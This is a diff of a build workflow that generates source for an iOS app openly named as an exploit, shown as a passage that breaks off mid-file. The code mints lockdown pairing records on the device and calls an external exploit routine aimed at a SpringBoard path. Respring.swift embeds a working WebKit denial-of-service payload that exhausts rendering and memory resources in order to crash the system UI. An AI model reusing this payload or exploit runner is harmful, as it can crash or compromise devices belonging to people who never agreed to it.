@@ -30,8 +30,8 @@ jobs:
           path: |
             ~/Library/Caches/Homebrew
             natsuk1.xcodeproj
-          key: nk-v44-${{ hashFiles('project.yml') }}
-          restore-keys: nk-v44-
+          key: nk-v46-${{ hashFiles('project.yml') }}
+          restore-keys: nk-v46-
 
       - name: Install tools
         run: |
@@ -129,6 +129,7 @@ jobs:
                 - sdk: WebKit.framework
                 - sdk: AVFoundation.framework
                 - sdk: CoreLocation.framework
+                - sdk: Network.framework
               settings:
                 base:
                   PRODUCT_BUNDLE_IDENTIFIER: com.natsuk1.exploit
@@ -140,73 +141,1687 @@ jobs:
                   OTHER_SWIFT_FLAGS: "$(inherited) -Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks"
                   OTHER_CFLAGS: -fno-autolink -std=c17 -Oz -Wno-everything -fno-objc-arc-exceptions -fvisibility=hidden -fno-unwind-tables -fno-asynchronous-unwind-tables -fomit-frame-pointer
                   OTHER_LDFLAGS: -Wl,-dead_strip -Wl,-dead_strip_dylibs -Wl,-x -Wl,-S -fobjc-arc -lz $(SRCROOT)/external/AirliftFFI.xcframework/ios-arm64/libairlift_ffi.a -lc++ -ObjC
-                  HEADER_SEARCH_PATHS: "$(SRCROOT)/natsuk1/Exploit/Core $(SRCROOT)/natsuk1/Exploit/Airlift $(SRCROOT)/external/AirliftFFI.xcframework/ios-arm64/Headers"
+                  HEADER_SEARCH_PATHS: "$(SRCROOT)/natsuk1/Exploit/Core $(SRCROOT)/natsuk1/Exploit/Airlift $(SRCROOT)/natsuk1/Support $(SRCROOT)/external/AirliftFFI.xcframework/ios-arm64/Headers"
                   TARGETED_DEVICE_FAMILY: "1"
                   GENERATE_INFOPLIST_FILE: NO
                   ASSETCATALOG_COMPILER_APPICON_NAME: AppIcon
                   ASSETCATALOG_COMPILER_OPTIMIZATION: space
                   ENABLE_ONLY_ACTIVE_RESOURCES: YES
           PROJECT_EOF
+
+      - name: Write bridging.h
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Support
+          cat > natsuk1/Support/bridging.h <<'SUPPORT_H_EOF'
+          #ifndef NATSUK1_BRIDGING_H
+          #define NATSUK1_BRIDGING_H
+
+          #include <stdint.h>
+          #include "nk_api.h"
+          #include "GrappaHelper.h"
+          #include "airlift.h"
+          #include "idevice_shim.h"
+
+          #endif
+          SUPPORT_H_EOF
+
+      - name: Write idevice_shim.h
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Support
+          cat > natsuk1/Support/idevice_shim.h <<'SHIM_H_EOF'
+          #ifndef NATSUK1_IDEVICE_SHIM_H
+          #define NATSUK1_IDEVICE_SHIM_H
+          #include <stdint.h>
+          #include <stddef.h>
+          #include <sys/socket.h>
+          typedef socklen_t idevice_socklen_t;
+          typedef struct IdeviceHandle IdeviceHandle;
+          typedef struct IdevicePairingFile IdevicePairingFile;
+          typedef struct LockdowndClientHandle LockdowndClientHandle;
+          typedef struct IdeviceFfiError {
+              int32_t code;
+              int32_t sub_code;
+              const char *message;
+          } IdeviceFfiError;
+          struct IdeviceFfiError *idevice_new_tcp_socket(const struct sockaddr *addr,
+                                                         idevice_socklen_t addr_len,
+                                                         const char *label,
+                                                         struct IdeviceHandle **idevice);
+          struct IdeviceFfiError *lockdownd_new(struct IdeviceHandle *socket,
+                                                struct LockdowndClientHandle **client);
+          struct IdeviceFfiError *lockdownd_pair(struct LockdowndClientHandle *client,
+                                                 const char *host_id,
+                                                 const char *system_buid,
+                                                 const char *host_name,
+                                                 struct IdevicePairingFile **pairing_file);
+          struct IdeviceFfiError *idevice_pairing_file_serialize(const struct IdevicePairingFile *pairing_file,
+                                                                 uint8_t **data,
+                                                                 uintptr_t *size);
+          void lockdownd_client_free(struct LockdowndClientHandle *handle);
+          void idevice_free(struct IdeviceHandle *idevice);
+          void idevice_pairing_file_free(struct IdevicePairingFile *pairing_file);
+          void idevice_data_free(uint8_t *data, uintptr_t len);
+          void idevice_error_free(struct IdeviceFfiError *err);
+          #endif
+          SHIM_H_EOF
+
       - name: Write PairingGenerator
         run: |
           set -euo pipefail
           mkdir -p natsuk1/Helpers
           cat > natsuk1/Helpers/PairingGenerator.swift <<'PAIRING_EOF'
           import Foundation
-
           final class PairingGenerator {
               static let shared = PairingGenerator()
               private init() {}
-
+              private let hostName = "natsuk1"
               enum GeneratorError: LocalizedError {
                   case missingFile(String)
                   case notAPlist(String)
+                  case noRemotePairing
+                  case lockdownUnavailable(String)
+                  case mergeFailed(String)
                   case writeFailed(String)
-
                   var errorDescription: String? {
                       switch self {
-                      case .missingFile(let s): return "Pairing file missing: \(s)"
-                      case .notAPlist(let s): return "Pairing file is not a plist: \(s)"
-                      case .writeFailed(let s): return "Write failed: \(s)"
+                      case let .missingFile(s):
+                          return "Pairing file missing: \(s)"
+                      case let .notAPlist(s):
+                          return "Pairing file is not a plist: \(s)"
+                      case .noRemotePairing:
+                          return "The pairing record has no public_key / private_key / identifier, "
+                              + "so it is not an RPPairing record. Pair again from the Airlift screen."
+                      case let .lockdownUnavailable(reason):
+                          return "The classic lockdown half was not issued, so the file still lacks "
+                              + "DeviceCertificate and Airlift's Lockdown fallback will fail. \(reason) "
+                              + "Unlock the iPhone, keep natsuk1 in the foreground and tap Trust when "
+                              + "asked, then pair again."
+                      case let .mergeFailed(reason):
+                          return "The two pairing records could not be merged: \(reason)"
+                      case let .writeFailed(reason):
+                          return "Write failed: \(reason)"
                       }
                   }
               }
-
+              private func status(_ text: String) {
+                  PairingController.shared.pairingStatus = text
+              }
               @discardableResult
               func generateMergedPairing(rppPath: String, outputPath: String) throws -> String {
                   let fm = FileManager.default
                   guard fm.fileExists(atPath: rppPath) else {
                       throw GeneratorError.missingFile(rppPath)
                   }
-                  guard let data = try? Data(contentsOf: URL(fileURLWithPath: rppPath)), !data.isEmpty else {
+                  guard let rpp = try? Data(contentsOf: URL(fileURLWithPath: rppPath)), !rpp.isEmpty else {
                       throw GeneratorError.missingFile("empty or unreadable: \(rppPath)")
                   }
                   guard let plist = try? PropertyListSerialization.propertyList(
-                      from: data, options: [], format: nil) as? [String: Any] else {
+                      from: rpp, options: [], format: nil) as? [String: Any], !plist.isEmpty else {
                       throw GeneratorError.notAPlist(rppPath)
                   }
-                  guard !plist.isEmpty else {
-                      throw GeneratorError.notAPlist("empty plist: \(rppPath)")
+                  let kind = PairingFileKind.of(data: rpp)
+                  if kind.hasLockdown {
+                      status("Pairing file already carries a lockdown record.")
+                      return try write(merged: rpp, outputPath: outputPath, sourcePath: rppPath)
                   }
-
-                  let canonical = PairingController.syncCanonicalPairingFile(from: rppPath)
-                  if outputPath != canonical {
+                  guard kind.hasRemotePairing else {
+                      throw GeneratorError.noRemotePairing
+                  }
+                  var lockdownRecord = CompositePairingFile.cachedLockdownRecord(forUDID: kind.udid)
+                  var mintFailure: String?
+                  if lockdownRecord == nil {
+                      status("Minting lockdown record — unlock the iPhone and tap Trust…")
                       do {
-                          try data.write(to: URL(fileURLWithPath: outputPath), options: .atomic)
+                          let record = try LockdownPair.mintRecord(
+                              hosts: LockdownPair.candidateHosts(),
+                              hostID: CompositePairingFile.hostID,
+                              systemBUID: CompositePairingFile.systemBUID,
+                              hostName: hostName)
+                          CompositePairingFile.storeLockdownRecord(record, forUDID: kind.udid)
+                          lockdownRecord = record
+                          status("Lockdown record minted (\(record.count) bytes).")
+                      } catch {
+                          mintFailure = (error as? LocalizedError)?.errorDescription
+                              ?? String(describing: error)
+                      }
+                  } else {
+                      status("Reusing the stored lockdown record.")
+                  }
+                  let merged: Data
+                  if let lockdownRecord {
+                      do {
+                          merged = try CompositePairingFile.merge(
+                              lockdown: lockdownRecord, rpPairing: rpp, udid: kind.udid)
+                      } catch {
+                          throw GeneratorError.mergeFailed(
+                              (error as? LocalizedError)?.errorDescription ?? String(describing: error))
+                      }
+                  } else {
+                      merged = rpp
+                  }
+                  let canonical = try write(merged: merged, outputPath: outputPath, sourcePath: rppPath)
+                  if let mintFailure {
+                      throw GeneratorError.lockdownUnavailable(mintFailure)
+                  }
+                  return canonical
+              }
+              private func write(merged: Data, outputPath: String, sourcePath: String) throws -> String {
+                  if outputPath != sourcePath {
+                      do {
+                          try merged.write(to: URL(fileURLWithPath: outputPath), options: .atomic)
                       } catch {
                           throw GeneratorError.writeFailed(error.localizedDescription)
                       }
+                  }
+                  let canonical = PairingController.syncCanonicalPairingFile(from: sourcePath)
+                  do {
+                      try merged.write(to: URL(fileURLWithPath: canonical), options: .atomic)
+                  } catch {
+                      throw GeneratorError.writeFailed(error.localizedDescription)
                   }
                   return canonical
               }
           }
           PAIRING_EOF
+
+      - name: Write CompositePairingFile
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Helpers
+          cat > natsuk1/Helpers/CompositePairingFile.swift <<'COMPOSITE_EOF'
+          import Foundation
+          struct PairingFileKind {
+              let hasRemotePairing: Bool
+              let hasLockdown: Bool
+              let udid: String?
+              var isUsable: Bool { hasRemotePairing || hasLockdown }
+              static let none = PairingFileKind(hasRemotePairing: false, hasLockdown: false, udid: nil)
+              static func of(path: String) -> PairingFileKind {
+                  guard let data = try? Data(contentsOf: URL(fileURLWithPath: path)) else { return .none }
+                  return of(data: data)
+              }
+              static func of(data: Data) -> PairingFileKind {
+                  guard !data.isEmpty,
+                        let parsed = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil),
+                        let dict = parsed as? [String: Any]
+                  else { return .none }
+                  let ed25519 = { (key: String) in (dict[key] as? Data)?.count == 32 }
+                  let remote = ed25519("public_key") && ed25519("private_key")
+                      && (dict["identifier"] as? String)?.isEmpty == false
+                  let present = { (key: String) in
+                      (dict[key] as? Data)?.isEmpty == false || (dict[key] as? String)?.isEmpty == false
+                  }
+                  let lockdown = present("HostCertificate") && present("HostPrivateKey")
+                      && present("DeviceCertificate")
+                  let udid = (dict["UDID"] as? String).flatMap { $0.isEmpty ? nil : $0 }
+                  return PairingFileKind(hasRemotePairing: remote, hasLockdown: lockdown, udid: udid)
+              }
+          }
+          enum CompositePairingFile {
+              private static let hostIDKey = "natsuk1LockdownHostID"
+              private static let systemBUIDKey = "natsuk1LockdownSystemBUID"
+              private static let recordUDIDKey = "natsuk1LockdownRecordUDID"
+              enum BuildError: LocalizedError {
+                  case notAPlistDictionary(String)
+                  var errorDescription: String? {
+                      switch self {
+                      case let .notAPlistDictionary(what):
+                          return "The \(what) record isn't a plist dictionary."
+                      }
+                  }
+              }
+              static var hostID: String { persistentUUID(forKey: hostIDKey) }
+              static var systemBUID: String { persistentUUID(forKey: systemBUIDKey) }
+              private static func persistentUUID(forKey key: String) -> String {
+                  if let stored = UserDefaults.standard.string(forKey: key), !stored.isEmpty {
+                      return stored
+                  }
+                  let raw = UUID().uuidString
+                  UserDefaults.standard.set(raw, forKey: key)
+                  return raw
+              }
+              private static var documents: URL {
+                  FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+              }
+              static var cachedLockdownURL: URL {
+                  documents.appendingPathComponent(".natsuk1_lockdown_record")
+              }
+              static var mergedURL: URL {
+                  documents.appendingPathComponent("ALTPairingFile.mobiledevicepairing")
+              }
+              static func cachedLockdownRecord(forUDID udid: String?) -> Data? {
+                  guard let udid, !udid.isEmpty,
+                        UserDefaults.standard.string(forKey: recordUDIDKey) == udid,
+                        let data = try? Data(contentsOf: cachedLockdownURL),
+                        !data.isEmpty
+                  else { return nil }
+                  return data
+              }
+              static func storeLockdownRecord(_ data: Data, forUDID udid: String?) {
+                  try? data.write(to: cachedLockdownURL, options: .atomic)
+                  UserDefaults.standard.set(udid ?? "", forKey: recordUDIDKey)
+              }
+              static func clearLockdownRecord() {
+                  try? FileManager.default.removeItem(at: cachedLockdownURL)
+                  UserDefaults.standard.removeObject(forKey: recordUDIDKey)
+              }
+              static func merge(lockdown: Data, rpPairing: Data, udid: String?) throws -> Data {
+                  var merged = try dictionary(from: lockdown, describing: "lockdown")
+                  for (key, value) in try dictionary(from: rpPairing, describing: "RPPairing") {
+                      merged[key] = value
+                  }
+                  if let udid, !udid.isEmpty, (merged["UDID"] as? String)?.isEmpty != false {
+                      merged["UDID"] = udid
+                  }
+                  return try PropertyListSerialization.data(fromPropertyList: merged, format: .xml, options: 0)
+              }
+              private static func dictionary(from data: Data, describing what: String) throws -> [String: Any] {
+                  let parsed = try PropertyListSerialization.propertyList(from: data, options: [], format: nil)
+                  guard let dict = parsed as? [String: Any] else {
+                      throw BuildError.notAPlistDictionary(what)
+                  }
+                  return dict
+              }
+          }
+          COMPOSITE_EOF
+
+      - name: Write LockdownPair
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Helpers
+          cat > natsuk1/Helpers/LockdownPair.swift <<'LOCKDOWN_EOF'
+          import Foundation
+          import Darwin
+          enum LockdownPair {
+              static let port: UInt16 = 62078
+              private static let userDeniedPairingCode: Int32 = 31
+              struct Failure: LocalizedError {
+                  enum Stage: String {
+                      case connect
+                      case pair
+                      case serialize
+                  }
+                  let stage: Stage
+                  let host: String
+                  let code: Int32
+                  let subCode: Int32
+                  let message: String
+                  var userDeclined: Bool {
+                      stage == .pair
+                          && (code == LockdownPair.userDeniedPairingCode || message.contains("UserDeniedPairing"))
+                  }
+                  var errorDescription: String? {
+                      if userDeclined {
+                          return "Trust was declined on the iPhone, so no lockdown record was issued."
+                      }
+                      return "lockdownd \(stage.rawValue) at \(host):\(LockdownPair.port) failed "
+                          + "(code \(code)/\(subCode)): \(message)"
+                  }
+              }
+              static func candidateHosts() -> [String] {
+                  var hosts: [String] = []
+                  if let peer = NetworkStatus.tunnelIP() { hosts.append(peer) }
+                  hosts.append(contentsOf: ["10.7.0.1", "10.7.0.2", "10.7.0.3", "127.0.0.1"])
+                  var seen = Set<String>()
+                  return hosts.filter { seen.insert($0).inserted }
+              }
+              static func mintRecord(hosts: [String],
+                                     hostID: String,
+                                     systemBUID: String,
+                                     hostName: String) throws -> Data {
+                  guard !hosts.isEmpty else {
+                      throw Failure(stage: .connect, host: "", code: -1, subCode: 0,
+                                    message: "no address to reach lockdownd on")
+                  }
+                  var last: Failure?
+                  for host in hosts {
+                      do {
+                          return try pair(host: host, hostID: hostID,
+                                          systemBUID: systemBUID, hostName: hostName)
+                      } catch let failure as Failure {
+                          last = failure
+                          if failure.userDeclined { throw failure }
+                      }
+                  }
+                  throw last ?? Failure(stage: .connect, host: hosts.joined(separator: ", "),
+                                        code: -1, subCode: 0, message: "lockdownd did not pair")
+              }
+              private static func pair(host: String,
+                                       hostID: String,
+                                       systemBUID: String,
+                                       hostName: String) throws -> Data {
+                  var addr = sockaddr_in()
+                  addr.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
+                  addr.sin_family = sa_family_t(AF_INET)
+                  addr.sin_port = port.bigEndian
+                  guard host.withCString({ inet_pton(AF_INET, $0, &addr.sin_addr) }) == 1 else {
+                      throw Failure(stage: .connect, host: host, code: -1, subCode: 0,
+                                    message: "invalid address")
+                  }
+                  var device: OpaquePointer?
+                  let connectError = withUnsafePointer(to: &addr) { aptr in
+                      aptr.withMemoryRebound(to: sockaddr.self, capacity: 1) { sa in
+                          hostName.withCString { label in
+                              idevice_new_tcp_socket(sa, socklen_t(MemoryLayout<sockaddr_in>.size),
+                                                     label, &device)
+                          }
+                      }
+                  }
+                  if let failure = consume(connectError, host, .connect) { throw failure }
+                  guard let device else {
+                      throw Failure(stage: .connect, host: host, code: -1, subCode: 0,
+                                    message: "lockdown socket handle was null")
+                  }
+                  var client: OpaquePointer?
+                  let newError = lockdownd_new(device, &client)
+                  if let failure = consume(newError, host, .connect) {
+                      idevice_free(device)
+                      throw failure
+                  }
+                  guard let client else {
+                      idevice_free(device)
+                      throw Failure(stage: .connect, host: host, code: -1, subCode: 0,
+                                    message: "lockdown client was null")
+                  }
+                  defer { lockdownd_client_free(client) }
+                  var record: OpaquePointer?
+                  let pairError = hostID.withCString { h in
+                      systemBUID.withCString { b in
+                          hostName.withCString { n in
+                              lockdownd_pair(client, h, b, n, &record)
+                          }
+                      }
+                  }
+                  if let failure = consume(pairError, host, .pair) { throw failure }
+                  guard let record else {
+                      throw Failure(stage: .pair, host: host, code: -1, subCode: 0,
+                                    message: "lockdownd_pair returned no pair record")
+                  }
+                  defer { idevice_pairing_file_free(record) }
+                  var bytes: UnsafeMutablePointer<UInt8>?
+                  var length: UInt = 0
+                  let serializeError = idevice_pairing_file_serialize(record, &bytes, &length)
+                  if let failure = consume(serializeError, host, .serialize) { throw failure }
+                  guard let bytes, length > 0 else {
+                      throw Failure(stage: .serialize, host: host, code: -1, subCode: 0,
+                                    message: "serialised pair record was empty")
+                  }
+                  defer { idevice_data_free(bytes, length) }
+                  return Data(bytes: bytes, count: Int(length))
+              }
+              private static func consume(_ err: UnsafeMutablePointer<IdeviceFfiError>?,
+                                          _ host: String,
+                                          _ stage: Failure.Stage) -> Failure? {
+                  guard let err else { return nil }
+                  let code = err.pointee.code
+                  let subCode = err.pointee.sub_code
+                  let message = err.pointee.message.flatMap { String(validatingUTF8: $0) } ?? ""
+                  idevice_error_free(err)
+                  return Failure(stage: stage, host: host, code: code, subCode: subCode,
+                                 message: message.isEmpty ? "unknown error" : message)
+              }
+          }
+          LOCKDOWN_EOF
+
+      - name: Write AirliftBridge
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Helpers
+          cat > natsuk1/Helpers/AirliftBridge.swift <<'AIRLIFT_EOF'
+          import Foundation
+          import Combine
+
+          final class AirliftBridge: ObservableObject, @unchecked Sendable {
+              static let shared = AirliftBridge()
+
+              enum State: Equatable {
+                  case idle
+                  case pairing
+                  case ready(pairingPath: String)
+                  case running
+                  case done(ok: Bool, message: String)
+              }
+
+              @Published private(set) var state: State = .idle
+              @Published private(set) var pairPIN: String? = nil
+              @Published private(set) var pairingStatus: String = ""
+              @Published private(set) var exploitLog: [String] = []
+              @Published var target: String = "/var/mobile/Library/SpringBoard"
+
+              private var loggedLines: [String] = []
+              private var pairingBusy = false
+              private var statusTimer: Timer?
+
+              private init() {
+                  al_log_init({ _, msg in
+                      guard let msg = msg else { return }
+                      let line = String(cString: msg)
+                      DispatchQueue.main.async { AirliftBridge.shared.appendLog(line) }
+                  }, nil)
+              }
+
+              private func appendLog(_ s: String) {
+                  DispatchQueue.main.async {
+                      self.loggedLines.append(s)
+                      if self.loggedLines.count > 800 {
+                          self.loggedLines.removeFirst(self.loggedLines.count - 600)
+                      }
+                      self.exploitLog = self.loggedLines
+                  }
+              }
+
+              func clearLog() {
+                  DispatchQueue.main.async {
+                      self.loggedLines.removeAll()
+                      self.exploitLog = []
+                  }
+              }
+
+              private static var documents: URL {
+                  FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
+                      ?? URL(fileURLWithPath: NSTemporaryDirectory())
+              }
+
+              func pairingFilePath() -> String { PairingController.pairingFilePath() }
+
+              func hasPairing() -> Bool {
+                  PairingFileKind.of(path: pairingFilePath()).hasLockdown
+              }
+
+              var pairingKind: PairingFileKind {
+                  PairingFileKind.of(path: pairingFilePath())
+              }
+
+              func pairingFileExists() -> Bool {
+                  let p = pairingFilePath()
+                  guard FileManager.default.fileExists(atPath: p) else { return false }
+                  let size = (try? FileManager.default.attributesOfItem(atPath: p)[.size] as? Int) ?? 0
+                  return size > 0
+              }
+
+              private func setState(_ s: State) { DispatchQueue.main.async { self.state = s } }
+              private func setStatus(_ s: String) { DispatchQueue.main.async { self.pairingStatus = s } }
+              private func setPIN(_ p: String?) { DispatchQueue.main.async { self.pairPIN = p } }
+
+              private static func fileMTime(_ path: String) -> Date? {
+                  (try? FileManager.default.attributesOfItem(atPath: path)[.modificationDate]) as? Date
+              }
+
+              func runPairing() {
+                  guard !hasPairing() else {
+                      setState(.ready(pairingPath: pairingFilePath()))
+                      return
+                  }
+                  setState(.pairing)
+                  setStatus("Starting host...")
+                  setPIN(nil)
+                  pairingBusy = true
+
+                  let ctrl = PairingController.shared
+                  let path = pairingFilePath()
+                  let mtimeBefore = Self.fileMTime(path)
+
+                  DispatchQueue.main.async {
+                      if ctrl.running { ctrl.softCancel() }
+                      self.statusTimer?.invalidate()
+                      var sawRunning = false
+                      var idleTicks = 0
+                      var ticks = 0
+
+                      DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) { ctrl.start() }
+
+                      self.statusTimer = Timer.scheduledTimer(withTimeInterval: 0.2, repeats: true) { [weak self] t in
+                          guard let self = self else { t.invalidate(); return }
+                          ticks += 1
+                          self.setStatus(ctrl.pairingStatus)
+                          self.setPIN(ctrl.pairingPIN)
+
+                          if ctrl.running {
+                              sawRunning = true
+                              idleTicks = 0
+                          } else {
+                              idleTicks += 1
+                          }
+
+                          let startedThenStopped = sawRunning && !ctrl.running
+                          let neverStarted = !sawRunning && idleTicks > 50
+                          let gaveUp = ticks > 1800
+
+                          if startedThenStopped || neverStarted || gaveUp {
+                              t.invalidate()
+                              self.statusTimer = nil
+                              self.finishPairing(path: path, mtimeBefore: mtimeBefore, neverStarted: neverStarted)
+                          }
+                      }
+                  }
+              }
+
+              private func finishPairing(path: String, mtimeBefore: Date?, neverStarted: Bool) {
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      if neverStarted {
+                          self.setState(.idle)
+                          self.setStatus("Pairing host did not start. Check Local Network permission.")
+                          self.pairingBusy = false
+                          return
+                      }
+                      let kind = PairingFileKind.of(path: path)
+                      let mtime = AirliftBridge.fileMTime(path)
+                      let fresh = mtime != nil && mtime != mtimeBefore
+                      if kind.hasRemotePairing && fresh {
+                          self.setStatus("Minting lockdown record...")
+                          do {
+                              try self.generateMerged(rppPath: path)
+                              self.setState(.ready(pairingPath: path))
+                              self.setStatus("Pairing file ready")
+                          } catch {
+                              self.setState(.idle)
+                              self.setStatus("Failed: \(error.localizedDescription)")
+                          }
+                      } else {
+                          self.setState(.idle)
+                          self.setStatus("No new pairing record was written. \(PairingController.shared.pairingStatus)")
+                      }
+                      self.setPIN(nil)
+                      self.pairingBusy = false
+                  }
+              }
+
+              private func generateMerged(rppPath: String) throws {
+                  let out = Self.documents.appendingPathComponent("ALTPairingFile.mobiledevicepairing")
+                  try PairingGenerator.shared.generateMergedPairing(
+                      rppPath: rppPath,
+                      outputPath: out.path
+                  )
+              }
+
+              func cancelPairing() {
+                  PairingController.shared.softCancel()
+                  DispatchQueue.main.async {
+                      self.statusTimer?.invalidate()
+                      self.statusTimer = nil
+                  }
+                  pairingBusy = false
+                  setState(.idle)
+                  setStatus("")
+                  setPIN(nil)
+              }
+
+              func deletePairing() {
+                  let fm = FileManager.default
+                  let docs = Self.documents
+                  let candidates = [
+                      docs.appendingPathComponent("natsuk1_pairing.plist"),
+                      docs.appendingPathComponent("ALTPairingFile.mobiledevicepairing"),
+                      docs.appendingPathComponent("pairingFile.plist"),
+                  ]
+                  for url in candidates where fm.fileExists(atPath: url.path) {
+                      try? fm.removeItem(at: url)
+                  }
+                  if let custom = PairingController.customPairingFilePath, fm.fileExists(atPath: custom) {
+                      try? fm.removeItem(atPath: custom)
+                  }
+                  PairingController.customPairingFilePath = nil
+                  if let files = try? fm.contentsOfDirectory(atPath: docs.path) {
+                      for f in files {
+                          guard f.hasSuffix(".plist")
+                              || f.hasSuffix(".mobilepairing")
+                              || f.hasSuffix(".mobilepair") else { continue }
+                          try? fm.removeItem(at: docs.appendingPathComponent(f))
+                      }
+                  }
+                  UserDefaults.standard.removeObject(forKey: "natsuk1PairingHostAltIRK")
+                  UserDefaults.standard.removeObject(forKey: "natsuk1PairingPath")
+                  setState(.idle)
+                  setStatus("")
+                  setPIN(nil)
+              }
+
+              func runExploit() {
+                  let pairingPath = pairingFilePath()
+                  guard FileManager.default.fileExists(atPath: pairingPath) else {
+                      setState(.done(ok: false, message: "No pairing file"))
+                      return
+                  }
+                  setState(.running)
+                  DispatchQueue.main.async {
+                      self.loggedLines.removeAll()
+                      self.exploitLog = []
+                  }
+                  let t = target
+                  let bridge = self
+                  appendLog("[exploit] path=\(pairingPath) target=\(t)")
+                  DispatchQueue.global(qos: .userInitiated).async {
+                      var outJson: UnsafeMutablePointer<CChar>? = nil
+                      var outError: UnsafeMutablePointer<CChar>? = nil
+                      let rc: Int32 = pairingPath.withCString { pc in
+                          t.withCString { tc in
+                              al_exploit_run(pc, tc, nil, nil, &outJson, &outError)
+                          }
+                      }
+                      let jsonStr = outJson.flatMap { p -> String? in
+                          let s = String(cString: p); al_string_free(p); return s
+                      }
+                      let errStr = outError.flatMap { p -> String? in
+                          let s = String(cString: p); al_string_free(p); return s
+                      }
+                      if rc == 0 {
+                          let msg = jsonStr ?? "OK"
+                          bridge.appendLog("[exploit] ok: \(msg)")
+                          bridge.setState(.done(ok: true, message: msg))
+                      } else {
+                          let msg = errStr ?? "rc=\(rc)"
+                          bridge.appendLog("[exploit] fail: \(msg)")
+                          bridge.setState(.done(ok: false, message: msg))
+                      }
+                  }
+              }
+
+              func cancelExploit() {
+                  appendLog("[exploit] cancel requested")
+                  setState(.done(ok: false, message: "cancelled"))
+              }
+          }
+          AIRLIFT_EOF
+
+      - name: Write Respring
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Helpers
+          cat > natsuk1/Helpers/Respring.swift <<'RESPRING_EOF'
+          import UIKit
+          import Foundation
+          import WebKit
+          import SwiftUI
+
+          struct RespringView: UIViewRepresentable {
+              private static let html = "<!DOCTYPE html><html><body><iframe id=\"frame\" srcdoc=\"\" sandbox=\"allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts\"></iframe><script>const frame=document.getElementById('frame');const funfun=`<html><body><script>const container=document.createElement('div');container.style.cssText='perspective: 1px; perspective-origin: 9999999% 9999999%;';document.body.appendChild(container);for(let i=0;i<500;i++){let d=document.createElement('div');d.style.cssText='position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, '+i+'px) rotateY(90deg);';container.appendChild(d);}setInterval(()=>{navigator.share({title:'R',text:'R'.repeat(100000)}).catch(()=>{});let x=new Uint8Array(1024*1024*10);crypto.getRandomValues(x);},0);<\\/script></body></html>`;frame.srcdoc=funfun;</script></body></html>"
+
+              final class Coordinator {
+                  var loaded = false
+              }
+
+              func makeCoordinator() -> Coordinator { Coordinator() }
+
+              func makeUIView(context: Context) -> WKWebView {
+                  let config = WKWebViewConfiguration()
+                  config.defaultWebpagePreferences.allowsContentJavaScript = true
+                  let web = WKWebView(frame: .zero, configuration: config)
+                  web.isOpaque = false
+                  web.backgroundColor = .black
+                  return web
+              }
+
+              func updateUIView(_ webView: WKWebView, context: Context) {
+                  guard !context.coordinator.loaded else { return }
+                  context.coordinator.loaded = true
+                  webView.loadHTMLString(Self.html, baseURL: nil)
+              }
+          }
+          RESPRING_EOF
+
+      - name: Write NetworkStatus
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Helpers
+          cat > natsuk1/Helpers/NetworkStatus.swift <<'NETSTATUS_EOF'
+          import Foundation
+          import Darwin
+
+          enum NetworkStatus {
+              struct TunnelPair {
+                  let local: String
+                  let peer: String?
+                  let iface: String
+              }
+
+              private static func numericHost(_ addr: UnsafeMutablePointer<sockaddr>) -> String? {
+                  var host = [CChar](repeating: 0, count: Int(NI_MAXHOST))
+                  let len = socklen_t(MemoryLayout<sockaddr_in>.size)
+                  guard getnameinfo(addr, len, &host, socklen_t(host.count), nil, 0, NI_NUMERICHOST) == 0
+                  else { return nil }
+                  let bytes = host.prefix { $0 != 0 }.map { UInt8(bitPattern: $0) }
+                  return String(decoding: bytes, as: UTF8.self)
+              }
+
+              static func tunnelPairs() -> [TunnelPair] {
+                  var result: [TunnelPair] = []
+                  var ifaddr: UnsafeMutablePointer<ifaddrs>?
+                  guard getifaddrs(&ifaddr) == 0, let first = ifaddr else { return [] }
+                  defer { freeifaddrs(ifaddr) }
+                  var ptr: UnsafeMutablePointer<ifaddrs>? = first
+                  while let cur = ptr {
+                      defer { ptr = cur.pointee.ifa_next }
+                      guard let namePtr = cur.pointee.ifa_name else { continue }
+                      let name = String(cString: namePtr)
+                      guard isTunnelInterface(name) else { continue }
+                      guard let addr = cur.pointee.ifa_addr,
+                            addr.pointee.sa_family == sa_family_t(AF_INET) else { continue }
+                      guard let local = numericHost(addr), isLoopbackRange(local) else { continue }
+                      var peer: String? = nil
+                      if let dst = cur.pointee.ifa_dstaddr,
+                         dst.pointee.sa_family == sa_family_t(AF_INET) {
+                          if let p = numericHost(dst), isLoopbackRange(p), p != local { peer = p }
+                      }
+                      result.append(TunnelPair(local: local, peer: peer, iface: name))
+                  }
+                  return result
+              }
+
+              static func loopbackVPNUp() -> Bool {
+                  return !tunnelPairs().isEmpty
+              }
+
+              static func tunnelIP() -> String? {
+                  for p in tunnelPairs() {
+                      if let peer = p.peer { return peer }
+                  }
+                  return nil
+              }
+
+              static func deviceIP() -> String? {
+                  for p in tunnelPairs() { return p.local }
+                  return nil
+              }
+
+              static func isLoopbackRange(_ ip: String) -> Bool {
+                  return ip.hasPrefix("10.7.")
+              }
+
+              static func isTunnelInterface(_ name: String) -> Bool {
+                  name.hasPrefix("utun") || name.hasPrefix("ipsec")
+                      || name.hasPrefix("tap") || name.hasPrefix("ppp")
+              }
+          }
+          NETSTATUS_EOF
+
+      - name: Write OffsetsStore
+        run: |
+          set -euo pipefail
+          mkdir -p natsuk1/Helpers
+          cat > natsuk1/Helpers/OffsetsStore.swift <<'OFFSETS_EOF'
+          import Foundation
+          import Combine
+
+          final class OffsetsStore: ObservableObject, @unchecked Sendable {
+              static let shared = OffsetsStore()
+
+              struct Group: Codable {
+                  let title: String
+                  let items: [String]
+              }
+
+              struct VersionEntry: Codable {
+                  let file: String
+                  let device: String
+                  let deviceName: String
+                  let chip: String
